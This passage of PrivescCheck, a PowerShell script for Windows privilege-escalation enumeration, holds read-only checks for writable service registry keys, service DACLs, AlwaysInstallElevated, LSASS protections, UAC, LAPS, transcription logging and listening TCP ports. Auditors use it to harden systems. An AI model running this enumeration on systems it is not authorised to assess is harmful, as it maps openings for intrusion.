    ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService}
    IdentityReference : NT AUTHORITY\INTERACTIVE
    Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadExtendedAttributes, ReadData/ListDirectory}
    Status            : Running
    UserCanStart      : True
    UserCanRestart    : False
    
    #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [String[]]
        $Path
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {
        $KeyAcl = Get-Acl -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetAclError
        if (-not $GetAclError) {
            $KeyAcl | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                $RegistryRights = $_.RegistryRights.value__

                $Permissions = $AccessMask.Keys | Where-Object { $RegistryRights -band $_ } | ForEach-Object { $accessMask[$_] }

                # the set of permission types that allow for modification
                $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                if($Comparison) {
                    if ($_.IdentityReference -notmatch '^S-1-5.*') {
                        if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                            # translate the IdentityReference if it's a username and not a SID
                            $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                            $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                        }
                        $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                    }
                    else {
                        $IdentitySID = $_.IdentityReference
                    }

                    if($CurrentUserSids -contains $IdentitySID) {
                        New-Object -TypeName PSObject -Property @{
                            ModifiablePath = $Path
                            IdentityReference = $_.IdentityReference
                            Permissions = $Permissions
                        }
                    }
                }
            }
        }
    } 
}

function Add-ServiceDacl {
    <#
    .SYNOPSIS

    Adds a Dacl field to a service object returned by Get-Service.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause

    .DESCRIPTION

    Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
    Dacl field to each object. It does this by opening a handle with ReadControl for the
    service with using the GetServiceHandle Win32 API call and then uses
    QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

    @itm4n: I had to make some small changes to the original code because i don't import the
    Win32 API functions the same way it was done in PowerUp.

    .PARAMETER Name

    An array of one or more service names to add a service Dacl for. Passable on the pipeline.

    .EXAMPLE

    PS C:\> Get-Service | Add-ServiceDacl

    Add Dacls for every service the current user can read.

    .EXAMPLE

    PS C:\> Get-Service -Name VMTools | Add-ServiceDacl

    Add the Dacl to the VMTools service object.

    .OUTPUTS

    ServiceProcess.ServiceController

    .LINK

    https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    #>

    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )
            Add-Type -AssemblyName System.ServiceProcess # ServiceProcess is not loaded by default  
            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ReadControl = 0x00020000
            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue -ErrorVariable GetServiceError
            if (-not $GetServiceError) {

                try {
                    $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
                }
                catch {
                    $ServiceHandle = $Null
                }

                if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                    $SizeNeeded = 0

                    $Result = [PrivescCheck.Win32]::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded)
                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    # 122 == The data area passed to a system call is too small
                    if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                        $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                        $Result = [PrivescCheck.Win32]::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded)
                        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result) {
                            
                            $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0

                            $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                                Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value $([PrivescCheck.Win32+ServiceAccessFlags] $_.AccessMask) -PassThru
                            }

                            Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                        }
                    }

                    $Null = [PrivescCheck.Win32]::CloseServiceHandle($ServiceHandle)
                }
            }
        }
    }
}

function Get-UEFIStatus {
    <#
    .SYNOPSIS

    Helper - Gets the BIOS mode of the machine (Legacy / UEFI)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Invokes the "GetFirmwareEnvironmentVariable()" function from the Windows API with dummy 
    parameters. Indeed, the queried value doesn't matter, what matters is the last error code,
    which you can get by invoking "GetLastError()". If the return code is ERROR_INVALID_FUNCTION,
    this means that the function is not supported by the BIOS so it's LEGACY. Otherwise, the error
    code will indicate that it cannot find the requested variable, which means that the function is
    supported by the BIOS so it's UEFI. 
    
    .EXAMPLE

    PS C:\> Get-BiosMode

    Name Status Description      
    ---- ------ -----------
    UEFI   True BIOS mode is UEFI
    
    .NOTES

    https://github.com/xcat2/xcat-core/blob/master/xCAT-server/share/xcat/netboot/windows/detectefi.cpp
    https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getfirmwareenvironmentvariablea
    https://github.com/ChrisWarwick/GetUEFI/blob/master/GetFirmwareBIOSorUEFI.psm1

    #>

    [CmdletBinding()]Param()

    $OsVersion = [System.Environment]::OSVersion.Version

    # Windows >= 8/2012
    if (($OsVersion.Major -ge 10) -or (($OsVersion.Major -ge 6) -and ($OsVersion.Minor -ge 2))) {

        [int]$FirmwareType = 0
        $Result = [PrivescCheck.Win32]::GetFirmwareType([ref]$FirmwareType)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if ($Result -gt 0) {
            if ($FirmwareType -eq 1) {
                # FirmwareTypeBios = 1
                $Status = $False 
                $Description = "BIOS mode is Legacy"
            } elseif ($FirmwareType -eq 2) {
                # FirmwareTypeUefi = 2
                $Status = $True 
                $Description = "BIOS mode is UEFI"
            } else {
                $Description = "BIOS mode is unknown"
            }
        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

    # Windows = 7/2008 R2
    } elseif (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -eq 1)) {

        [PrivescCheck.Win32]::GetFirmwareEnvironmentVariable("", "{00000000-0000-0000-0000-000000000000}", [IntPtr]::Zero, 0) | Out-Null 
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
        $ERROR_INVALID_FUNCTION = 1
        if ($LastError -eq $ERROR_INVALID_FUNCTION) {
            $Status = $False 
            $Description = "BIOS mode is Legacy"
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        } else {
            $Status = $True 
            $Description = "BIOS mode is UEFI"
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }
        
    } else {
        $Description = "Cannot check BIOS mode"
    }

    $BiosMode = New-Object -TypeName PSObject
    $BiosMode | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "UEFI"
    $BiosMode | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $BiosMode | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $BiosMode
}

function Get-SecureBootStatus {
    <#
    .SYNOPSIS
    
    Helper - Get the status of Secure Boot (enabled/disabled/unsupported)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    In case of a UEFI BIOS, you can check whether 'Secure Boot' is enabled by looking at the 
    'UEFISecureBootEnabled' value of the following registry key: 'HKEY_LOCAL_MACHINE\SYSTEM\Current
    ControlSet\Control\SecureBoot\State'. 
    
    .EXAMPLE

    PS C:\> Get-SecureBootStatus

    Name        Status Description
    ----        ------ -----------
    Secure Boot   True Secure Boot is enabled

    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State"
    $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable $GetItemPropertyError 

    if (-not $GetItemPropertyError) {

        if (-not ($Null -eq $Result.UEFISecureBootEnabled)) {

            if ($Result.UEFISecureBootEnabled -eq 1) {
                $Status = $True
                $Description = "Secure Boot is enabled"
            } else {
                $Status = $False
                $Description = "Secure Boot is disabled"
            }
        } else {
            $Status = $False
            $Description = "Secure Boot is not supported"
        }
    } else {
        $Status = $False
        $Description = "Secure Boot is not supported"
    }

    $SecureBootStatus = New-Object -TypeName PSObject
    $SecureBootStatus | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "Secure Boot"
    $SecureBootStatus | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $SecureBootStatus | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $SecureBootStatus
}

function Get-CredentialGuardStatus {
    <#
    .SYNOPSIS

    Helper - Gets the status of Windows Defender Credential Guard 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Gets the status of the Credential Guard by reading the 'LsaCfgFlags' value of the following 
    registry key: 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA'. Possible values are:
    None=>Not configured, 0=>Disabled, 1=>Enabled with UEFI lock, 2=>Disabled without UEFI lock.
    
    .EXAMPLE

    PS C:\> Get-CredentialGuardStatus

    Name             Status Description
    ----             ------ -----------
    Credential Guard  False Credential Guard is not configured
    
    .LINK

    https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage

    #>
    
    [CmdletBinding()]Param()

    $OsVersion = [System.Environment]::OSVersion.Version

    if ($OsVersion.Major -ge 10) {

        $RegPath = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA"
        $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
    
        if (-not $GetItemPropertyError) {
    
            if (-not ($Null -eq $Result.LsaCfgFlags)) {
    
                if ($Result.LsaCfgFlags -eq 0) {
                    $Status = $False 
                    $Description = "Credential Guard is disabled"
                } elseif ($Result.LsaCfgFlags -eq 1) {
                    $Status = $True 
                    $Description = "Credential Guard is enabled with UEFI lock"
                } elseif ($Result.LsaCfgFlags -eq 2) {
                    $Status = $True
                    $Description = "Credential Guard is enabled without UEFI lock"
                } 
            } else {
                $Status = $False 
                $Description = "Credential Guard is not configured"
            }
        }
    } else {
        $Status = $False
        $Description = "Credential Guard is not supported on this OS"
    }

    $CredentialGuardStatus = New-Object -TypeName PSObject
    $CredentialGuardStatus | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "Credential Guard"
    $CredentialGuardStatus | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $CredentialGuardStatus | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $CredentialGuardStatus
}

function Get-LsaRunAsPPLStatus {
    <#
    .SYNOPSIS

    Helper - Gets the status of RunAsPPL option for LSA
    
    .DESCRIPTION

    RunAsPPL can be enabled for the LSA process in the registry. If it's enabled and the device has
    Secure Boot or UEFI, this setting is stored in the UEFI firmware so removing the registry key 
    won't disable this setting. 
    
    .EXAMPLE

    PS C:\> Get-LsaRunAsPPLStatus
    
    Name     Status Description        
    ----     ------ -----------
    RunAsPPL   True RunAsPPL is enabled
    
    .LINK

    https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
    #>
    

    [CmdletBinding()]Param()

    $OsVersion = [System.Environment]::OSVersion.Version

    # if Windows >= 8.1 / 2012 R2
    if ($OsVersion.Major -eq 10 -or ( ($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 3) )) {

        $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
        $Result = Get-ItemProperty -Path "REgistry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError

        if (-not $GetItemPropertyError) {

            if (-not ($Null -eq $Result.RunAsPPL)) {

                if ($Result.RunAsPPL -eq 1) {
                    $Status = $True 
                    $Description = "RunAsPPL is enabled"
                } else {
                    $Status = $False 
                    $Description = "RunAsPPL is disabled"
                } 
            } else {
                $Status = $False 
                $Description = "RunAsPPL is not configured"
            }
        }

    } else {
        # RunAsPPL not supported 
        $Status = $False 
        $Description = "RunAsPPL is not supported on this OS"
    }

    $LsaRunAsPplStatus = New-Object -TypeName PSObject
    $LsaRunAsPplStatus | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "RunAsPPL"
    $LsaRunAsPplStatus | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
    $LsaRunAsPplStatus | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
    $LsaRunAsPplStatus

}
#endregion Helpers 


# ----------------------------------------------------------------
# Checks  
# ----------------------------------------------------------------
#region Checks 

# ----------------------------------------------------------------
# BEGIN REGISTRY SETTINGS   
# ----------------------------------------------------------------
function Invoke-UacCheck {
    <#
    .SYNOPSIS

    Checks whether UAC (User Access Control) is enabled

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The state of UAC can be determined based on the value of the parameter "EnableLUA" in the
    following registry key:
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    0 = Disabled
    1 = Enabled 
    
    .EXAMPLE

    PS C:\> Invoke-UacCheck | fl

    Path      : Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA : 1
    Enabled   : True
    
    .NOTES

    "UAC was formerly known as Limited User Account (LUA)."

    .LINK

    https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-lua-settings-enablelua
    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"

    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    if (-not $GetItemPropertyError) {
        $UacResult = New-Object -TypeName PSObject
        $UacResult | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $RegPath
        $UacResult | Add-Member -MemberType "NoteProperty" -Name "EnableLUA" -Value $Item.EnableLUA
        $UacResult | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.EnableLUA -eq 1)
        $UacResult
    } else {
        Write-Verbose -Message "Error while querying '$RegPath'"
    }
}

function Invoke-LapsCheck {
    <#
    .SYNOPSIS

    Checks whether LAPS (Local Admin Password Solution) is enabled

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The status of LAPS can be check using the following registry key.
    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd

    #>
    
    [CmdletBinding()]Param()
    
    $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd"

    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
    if (-not $GetItemPropertyError) {
        $LapsResult = New-Object -TypeName PSObject 
        $LapsResult | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $RegPath
        $LapsResult | Add-Member -MemberType "NoteProperty" -Name "AdmPwdEnabled" -Value $Item.AdmPwdEnabled
        $LapsResult | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.AdmPwdEnabled -eq 1)
        $LapsResult
    }
}

function Invoke-PowershellTranscriptionCheck {
    <#
    .SYNOPSIS

    Checks whether PowerShell Transcription is configured/enabled

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Powershell Transcription is used to log PowerShell scripts execution. It can be configured 
    thanks to the Group Policy Editor. The settings are stored in the following registry key:
    HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
    
    .EXAMPLE

    PS C:\> Invoke-PowershellTranscriptionCheck | fl

    EnableTranscripting    : 1
    EnableInvocationHeader : 1
    OutputDirectory        : C:\Transcripts
    
    .NOTES

    If PowerShell Transcription is configured, the settings can be found here:

    C:\>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription

    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
        EnableTranscripting    REG_DWORD    0x1
        OutputDirectory    REG_SZ    C:\Transcripts
        EnableInvocationHeader    REG_DWORD    0x1
    
    To enable PowerShell Transcription:
    Group Policy Editor > Administrative Templates > Windows Components > Windows PowerShell > PowerShell Transcription
    Set an output directory and set the policy as Enabled

    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"

    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
    if (-not $GetItemPropertyError) {
        # PowerShell Transcription is configured 
        $PowershellTranscriptionResult = New-Object -TypeName PSObject 
        $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "EnableTranscripting" -Value $Item.EnableTranscripting
        $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "EnableInvocationHeader" -Value $Item.EnableInvocationHeader
        $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "OutputDirectory" -Value $Item.OutputDirectory
        $PowershellTranscriptionResult
    } 
}

function Invoke-RegistryAlwaysInstallElevatedCheck {
    <#
    .SYNOPSIS

    Checks whether the AlwaysInstallElevated key is set in the registry.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    AlwaysInstallElevated can be configured in both HKLM and HKCU. Therefore, this function will
    check these two locations and return the corresponding key if it exists and is enabled. 
    
    #>
    
    [CmdletBinding()]Param()

    $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer"

    if (Test-Path -Path "Registry::$RegPath" -ErrorAction SilentlyContinue) {

        $HKLMval = Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
            $RegistryAlwaysInstallElevatedItem = New-Object -TypeName PSObject 
            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
            $RegistryAlwaysInstallElevatedItem
        } 
    } 

    $RegPath = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"

    if (Test-Path -Path "Registry::$RegPath" -ErrorAction SilentlyContinue) {
        $HKCUval = (Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
            $RegistryAlwaysInstallElevatedItem = New-Object -TypeName PSObject
            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
            $RegistryAlwaysInstallElevatedItem
        }
    }   
}

function Invoke-LsaProtectionsCheck {
    <#
    .SYNOPSIS

    Checks whether LSASS is configured to run as a Protected Process 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First it reads the registry to check whether "RunAsPPL" is configured and enabled in the
    "LSA" key. It also checks whether additional protections such as Secure Boot or Credential
    Guard are configured / enabled. 
    
    .EXAMPLE

    On Windows 10:

    PS C:\> Invoke-LsaProtectionsCheck

    Name             Status Description
    ----             ------ -----------
    RunAsPPL           True RunAsPPL is enabled
    UEFI               True BIOS mode is UEFI
    Secure Boot        True Secure Boot is enabled
    Credential Guard  False Credential Guard is not configured
    
    .EXAMPLE

    On Windows Server 2012 R2:

    PS C:\> Invoke-LsaProtectionsCheck

    Name             Status Description
    ----             ------ -----------
    RunAsPPL          False RunAsPPL is not configured
    UEFI              False BIOS mode is Legacy
    Secure Boot       False Secure Boot is not supported
    Credential Guard  False Credential Guard is not supported on this OS

    #>
    
    [CmdletBinding()]Param()

    Get-LsaRunAsPPLStatus
    Get-UEFIStatus
    Get-SecureBootStatus
    Get-CredentialGuardStatus

}
# ----------------------------------------------------------------
# END REGISTRY SETTINGS   
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN NETWORK 
# ----------------------------------------------------------------
function Get-RpcRange {
    <#
    .SYNOPSIS

    Helper - Dynamically identifies the range of randomized RPC ports from a list of ports.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This function is a helper for the Invoke-TcpEndpointsCheck function. Windows uses a set of 
    RPC ports that are radomly allocated in the range 49152-65535 by default. If we want to 
    filter out these listening ports we must first figure out this set of ports. The aim of this 
    function is to guess this range using basic statistics on a given array of port numbers. We 
    can quite reliably identify the RPC port set because they are concentrated in a very small 
    range. It's not 100% reliable but it will do the job most of the time.
    
    .PARAMETER Ports

    An array of port numbers
    
    .EXAMPLE

    PS C:\> Get-RpcRange -Ports $Ports 

    MinPort MaxPort
    ------- -------
    49664   49672
    
    #>

    [CmdletBinding()]Param(
        [Parameter(Mandatory=$True)]
        [int[]]
        $Ports
    )

    function Get-Stats {
        [CmdletBinding()]Param(
            [int[]]$Ports,
            [int]$MinPort,
            [int]$MaxPort,
            [int]$Span
        )

        $Stats = @() 
        For ($i = $MinPort; $i -lt $MaxPort; $i += $Span) {
            $Counter = 0
            ForEach ($Port in $Ports) {
                if (($Port -ge $i) -and ($Port -lt ($i + $Span))) {
                    $Counter += 1
                }
            }
            $RangeStats = New-Object -TypeName PSObject 
            $RangeStats | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $i
            $RangeStats | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value ($i + $Span)
            $RangeStats | Add-Member -MemberType "NoteProperty" -Name "PortsInRange" -Value $Counter
            $Stats += $RangeStats 
        }
        $Stats
    }

    # We split the range 49152-65536 into blocks of size 32 and then, we take the block which has 
    # greater number of ports in it. 
    $Stats = Get-Stats -Ports $Ports -MinPort 49152 -MaxPort 65536 -Span 32

    $MaxStat = $Null
    ForEach ($Stat in $Stats) {
        if ($Stat.PortsInRange -gt $MaxStat.PortsInRange) {
            $MaxStat = $Stat
        }
    } 

    For ($i = 0; $i -lt 8; $i++) {
        $Span = ($MaxStat.MaxPort - $MaxStat.MinPort) / 2
        $NewStats = Get-Stats -Ports $Ports -MinPort $MaxStat.MinPort -MaxPort $MaxStat.MaxPort -Span $Span
        if ($NewStats) {
            if ($NewStats[0].PortsInRange -eq 0) {
                $MaxStat = $NewStats[1]
            } elseif ($NewStats[1].PortsInRange -eq 0) {
                $MaxStat = $NewStats[0]
            } else {
                break 
            }
        }
    }

    $RpcRange = New-Object -TypeName PSObject 
    $RpcRange | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $MaxStat.MinPort
    $RpcRange | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value $MaxStat.MaxPort
    $RpcRange
}

function Invoke-TcpEndpointsCheck {
    <#
    .SYNOPSIS

    Enumerates all TCP endpoints on the local machine (IPv4 and IPv6)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the custom "Get-NetworkEndpoints" function to enumerate all the TCP endpoints on the
    local machine, IPv4 and IPv6. The list can then be filtered based on a list of known ports.
    
    .PARAMETER Filtered

    Use this switch to filter out the list of endpoints returned by this function. The filter 
    excludes all the standard ports such as 445 or 139 and all the random RPC ports. The RPC port
    range is dynamically guessed using the helper function "Get-RpcRange".
    
    .EXAMPLE

    PS C:\> Invoke-TcpEndpointsCheck | ft

    IP   Proto LocalAddress       State      PID Name
    --   ----- ------------       -----      --- ----
    IPv4 TCP   0.0.0.0:135        LISTENING  968 svchost
    IPv4 TCP   0.0.0.0:445        LISTENING    4 System
    IPv4 TCP   0.0.0.0:5040       LISTENING 5408 svchost
    IPv4 TCP   0.0.0.0:49664      LISTENING  732 lsass
    IPv4 TCP   0.0.0.0:49665      LISTENING  564 wininit
    IPv4 TCP   0.0.0.0:49666      LISTENING 1208 svchost
    IPv4 TCP   0.0.0.0:49667      LISTENING 1412 svchost
    IPv4 TCP   0.0.0.0:49668      LISTENING 2416 spoolsv
    IPv4 TCP   0.0.0.0:49669      LISTENING  656 services
    IPv4 TCP   192.168.74.136:139 LISTENING    4 System
    IPv6 TCP   [::]:135           LISTENING  968 svchost
    IPv6 TCP   [::]:445           LISTENING    4 System
    IPv6 TCP   [::]:49664         LISTENING  732 lsass
    IPv6 TCP   [::]:49665         LISTENING  564 wininit
    IPv6 TCP   [::]:49666         LISTENING 1208 svchost
    IPv6 TCP   [::]:49667         LISTENING 1412 svchost
    IPv6 TCP   [::]:49668         LISTENING 2416 spoolsv
    IPv6 TCP   [::]:49669         LISTENING  656 services
    
    #>

    [CmdletBinding()]Param(
        [switch]$Filtered
    )

    $IgnoredPorts = @(135, 139, 445)

    $Endpoints = Get-NetworkEndpoints
    $Endpoints += Get-NetworkEndpoints -IPv6

    if ($Filtered) {
        $FilteredEndpoints = @()
        $AllPorts = @()
        $Endpoints | ForEach-Object { $AllPorts += $_.LocalPort }
        $AllPorts = $AllPorts | Sort-Object -Unique
        
        $RpcRange = Get-RpcRange -Ports $AllPorts
        Write-Verbose "Excluding port range: $($RpcRange.MinPort)-$($RpcRange.MaxPort)"
    
        $Endpoints | ForEach-Object {

            if (-not ($IgnoredPorts -contains $_.LocalPort)) {

                if ($RpcRange) {

                    if (($_.LocalPort -lt $RpcRange.MinPort) -or ($_.LocalPort -ge $RpcRange.MaxPort)) {
                        
                        $FilteredEndpoints += $_
                    }
                }
            }
        }
        $Endpoints = $FilteredEndpoints
    } 

    $Endpoints | ForEach-Object {
        $TcpEndpoint = New-Object -TypeName PSObject
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "State" -Value $_.State
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $_.PID
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $_.Name
        $TcpEndpoint
    }
}

function Invoke-UdpEndpointsCheck {
    <#
    .SYNOPSIS

    Enumerates all UDP endpoints on the local machine (IPv4 and IPv6)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

